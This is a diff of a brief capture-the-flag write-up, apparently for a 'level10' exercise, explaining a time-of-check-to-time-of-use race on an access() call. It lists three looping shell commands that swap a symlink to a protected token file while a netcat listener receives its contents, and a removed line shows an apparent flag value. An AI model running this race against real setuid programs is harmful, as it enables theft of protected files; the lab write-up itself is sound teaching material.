@@ -1,9 +1,13 @@
-3 terminals :
+When we used ltrace on level10 we saw a call to access.
+access is known to have a security hole because there is a Time-of-check to time-of-use exploit.
+So first we did:
 
-while true; do rm exploit; echo "not yet" > exploit; chmod 777 exploit; ./level10 exploit 10.12.1.133; done
+$> chmod 777 .
 
-while true; do nc -l 6969 ; done
+and then we openned 2 other terminals to run those 3 commands in each of them:
 
-while true; do rm exploit; ln -s token exploit ; done
+$> while true; do rm exploit; echo "not yet" > exploit; chmod 777 exploit; ./level10 exploit 10.12.1.133; done
 
-woupa2yuojeeaaed06riuj63c
+$> while true; do nc -l 6969 ; done
+
+$> while true; do rm exploit; ln -s token exploit ; done
